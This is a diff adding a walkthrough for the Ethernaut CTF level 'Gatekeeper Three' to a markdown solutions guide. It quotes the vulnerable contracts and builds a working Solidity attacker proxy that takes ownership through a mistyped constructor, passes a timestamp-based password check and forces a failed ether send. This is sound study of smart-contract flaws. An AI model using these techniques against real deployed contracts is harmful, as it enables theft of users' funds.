@@ -31,8 +31,7 @@ If you want to do the same, I recommend that you try to solve the levels on your
 26. [Level 25: Motorbike](#level-25-motorbike)
 27. [Level 26: DoubleEntryPoint](#level-26-doubleentrypoint)
 28. [Level 27: Good Samaritan](#level-27-good-samaritan)
-
-
+29. [Level 28: Gaatekeeper Three](#level-28-gatekeeper-three)
 
 ## Level 0: Intro <a name="level-0-intro"></a>
 
@@ -3014,3 +3013,228 @@ Deploy and provide the address of the GoodSamaritan contract and we are done :)
 >immediate target of the contract call (i.e., Wallet in this case). Any other
 >contract further down in the call chain can declare the same error and throw it
 >at an unexpected location, such as in the notify(uint256 amount) function in your attacker contract.
+
+## Level 28: Gaatekeeper Three <a name="level-28-gatekeeper-three">
+
+Another day for a hack :) Let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SimpleTrick {
+    GatekeeperThree public target;
+    address public trick;
+    uint256 private password = block.timestamp;
+
+    constructor(address payable _target) {
+        target = GatekeeperThree(_target);
+    }
+
+    function checkPassword(uint256 _password) public returns (bool) {
+        if (_password == password) {
+            return true;
+        }
+        password = block.timestamp;
+        return false;
+    }
+
+    function trickInit() public {
+        trick = address(this);
+    }
+
+    function trickyTrick() public {
+        if (address(this) == msg.sender && address(this) != trick) {
+            target.getAllowance(password);
+        }
+    }
+}
+
+contract GatekeeperThree {
+    address public owner;
+    address public entrant;
+    bool public allowEntrance;
+
+    SimpleTrick public trick;
+
+    function construct0r() public {
+        owner = msg.sender;
+    }
+
+    modifier gateOne() {
+        require(msg.sender == owner);
+        require(tx.origin != owner);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(allowEntrance == true);
+        _;
+    }
+
+    modifier gateThree() {
+        if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
+            _;
+        }
+    }
+
+    function getAllowance(uint256 _password) public {
+        if (trick.checkPassword(_password)) {
+            allowEntrance = true;
+        }
+    }
+
+    function createTrick() public {
+        trick = new SimpleTrick(payable(address(this)));
+        trick.trickInit();
+    }
+
+    function enter() public gateOne gateTwo gateThree {
+        entrant = tx.origin;
+    }
+
+    receive() external payable {}
+}
+```
+Our goal is to become an `entract` of the GatekeeperThree contract by calling
+the `enter()` function.
+
+The `enter()` function of the GatekeeperThree contract has 3 modifiers:
+
+1. `gateOne` - requires that the caller is the owner of the contract and the
+transaction origin is not the owner.
+2. `gateTwo` - requires that the `allowEntrance` variable is set to true.
+3. `gateThree` - requires that the contract balance is greater than `0.001 ether`
+and the owner receives `0.001 ether`.
+
+Time to see how we can break each of the gates.
+
+Let's start with `gateOne`. The `gateOne` modifier requires that the caller is
+the owner of the contract and the transaction origin is not the owner. The
+`tx.origin` variable returns the address of the account that initiated the transaction.
+That means, we have to call the `enter()` function using a proxy contract.
+
+When using a contract to call the `enter()` function, the `msg.sender` variable
+is the contract address, and the `tx.origin` variable is the address of the
+account that initiated the transaction.
+
+But how do we become owner? The `construct0r` function is a typo and should be
+`constructor`. That means, our proxy contract can call the `construct0r` function
+and become the owner of the contract.
+
+
+Here already a contract which breaks the `gateOne` modifier:
+
+```solidity
+interface GatekeeperThree {
+    function construct0r() external;
+    function enter() external;
+}
+
+contract GateBreaker {
+    
+    function enter(address _target) public {
+        GatekeeperThree gkt = GatekeeperThree(_target);
+        gkt.construct0r();
+        gkt.enter();
+    }
+}
+```
+
+Next, let's break the `gateTwo` modifier. The `gateTwo` modifier requires that
+the `allowEntrance` variable is set to true. The `allowEntrance` variable is
+set to true in the `getAllowance` function of the GatekeeperThree contract only
+if the `checkPassword` function of the SimpleTrick contract returns true.
+
+Having a look into the `checkPassword` function of the SimpleTrick contract,
+we see that the `password` variable is a state variable which holds the block
+timestamp. Alright, now let's see if the `SimpleTrick` contract also deployed
+while we request for a new instance of the `GatekeeperThree` contract. If not,
+we need to have a look into it, how that works.
+
+Let's see first, if the `trick` variable of the GatekeeperThree contract is set
+to the address of the `SimpleTrick` contract.
+
+In the console run `await contract.trick()`. It returns the zero address, which
+means that the `trick` variable is not set. That means we need to deploy it first.
+
+We see, that we `GatekeeperThree` contract has a `createTrick` function, which
+deploys a new instance of the `SimpleTrick` contract and sets the `trick` variable
+to the address of the new instance.
+
+During the deployment of the `SimpleTrick` contract, the `password` variable is
+set to the block timestamp. That means, we can call the `checkPassword` function
+by providing the block timestamp as the `_password` parameter.
+
+Here our proxy contract extended with the new information:
+
+```solidity
+interface GatekeeperThree {
+    function construct0r() external;
+    function createTrick() external;
+    function enter() external;
+    function getAllowance(uint256 _password) external;
+}
+
+contract GateBreaker {
+    
+    function enter(address _target) public {
+        GatekeeperThree gkt = GatekeeperThree(_target);
+        gkt.construct0r();
+
+        gkt.createTrick();
+        gkt.getAllowance(block.timestamp);
+
+        gkt.enter();
+    }
+}
+```
+
+Now, let's break the `gateThree` modifier. The `gateThree` modifier requires
+that the contract balance is greater than `0.001 ether` and the owner receives
+`0.001 ether`.
+
+We can simply send some Eth to our proxy and forward that to the
+`GatekeeperThree` contract. It has a `receive` function which allows to send
+Eth to the contract.
+
+Now regarding the `.send()` function - it tries to send `0.001` Eth to the
+owner of the contract. The `.send()` function returns false if the transfer
+fails. That means, we can send `0.0011` Eth to the contract and the transfer
+back to the owner has to fail.
+
+Let's add that part to our proxy contract:
+
+```solidity
+interface GatekeeperThree {
+    function construct0r() external;
+    function createTrick() external;
+    function enter() external;
+    function getAllowance(uint256 _password) external;
+}
+
+contract GateBreaker {
+    
+    function enter(address _target) public payable {
+        GatekeeperThree gkt = GatekeeperThree(_target);
+        gkt.construct0r();
+
+        gkt.createTrick();
+        gkt.getAllowance(block.timestamp);
+
+        payable(_target).transfer(msg.value);
+        gkt.enter();
+    }
+}
+```
+
+Let's give it a try :) Deploy your proxy contract and call the `enter()` function
+with the address of the `GatekeeperThree` contract and send `0.0011` Eth.
+
+And we are an entrant of the `GatekeeperThree` contract :)
+
+### Learning
+
+Not sure what new stuff we learned here, but it is always good to see how
+contracts can be exploited and practice our skills :)
+
